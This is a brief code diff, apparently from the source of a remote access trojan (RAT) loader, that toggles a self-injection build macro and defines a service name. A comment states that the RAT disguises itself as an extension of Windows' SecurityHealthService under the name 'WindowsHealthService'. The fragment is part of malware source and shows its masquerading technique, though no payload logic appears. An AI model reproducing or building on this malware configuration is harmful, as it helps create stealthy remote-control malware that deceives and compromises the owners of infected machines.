@@ -5,7 +5,7 @@
 //#define DEBUG 
 
 //Uncommenting this macro will make the loader perform auto injection instead of relying on the embedded image
-#define SELF_INJECTION
+//#define SELF_INJECTION
 
 //The RAT will attempt to disguise itself as an extension of the already existing SecurityHealthService
 #define SERVICE_NAME			"WindowsHealthService"
